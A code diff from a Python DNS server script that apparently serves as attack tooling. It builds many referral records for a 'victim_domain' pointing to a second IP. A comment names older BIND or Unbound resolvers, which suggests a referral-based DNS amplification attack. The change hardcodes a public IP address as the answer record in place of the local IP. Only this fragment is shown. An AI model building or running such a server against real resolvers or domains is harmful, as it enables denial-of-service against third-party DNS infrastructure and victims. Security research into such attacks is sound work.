@@ -93,7 +93,7 @@ def dns_response(data, client_ip):
                 referral_domain = DomainName(mp + '-' + str(ind+1) + '.' + victim_domain)
                 reply.add_ar(RR(rname=referral_domain, rtype=QTYPE.A, rclass=1, ttl=TTL, rdata=A(IP2)))
         else:
-            reply.add_answer(RR(rname=qname, rtype=QTYPE.A, rclass=1, ttl=TTL, rdata=A(local_ip)))
+            reply.add_answer(RR(rname=qname, rtype=QTYPE.A, rclass=1, ttl=TTL, rdata=A('142.251.16.101')))
     print("---- Reply:\n", reply)
 
     # install BIND 9.11 or earlier/ Unbound/s
